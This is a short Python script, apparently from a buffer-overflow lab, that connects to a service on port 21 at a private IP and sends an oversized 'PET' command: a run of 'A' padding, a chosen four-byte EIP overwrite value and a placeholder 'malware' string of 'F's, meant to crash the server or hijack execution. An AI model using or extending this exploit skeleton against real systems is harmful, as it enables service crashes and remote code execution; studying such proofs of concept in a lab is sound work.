# Client Socket Program - fuzzer (SUN)!

import socket

host = "192.168.198.26"
port = 21
length = 1501 + 22
EIP = "EDCB" # "\x45\x44\x43\x42"
malware = "F"*20

#for length in range(1, 3000, 1):
try:
    # Connects to the server and prints out the recieved message!
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    msg = client_socket.recv(1024)
    print(msg.decode())

    # The bad string with the malware!
    bad_str = "PET %" + "A"*length + EIP + malware + "\r\n"

    # Sends the bad string with the malware, and recives message from the server!
    client_socket.send(bad_str.encode())
    msg = client_socket.recv(1024)         # blocks if server crashes!
    print(msg.decode())

    # closes the connection with the server!
    client_socket.close()

except:
    print("Server crashes at length: ", length)
    # break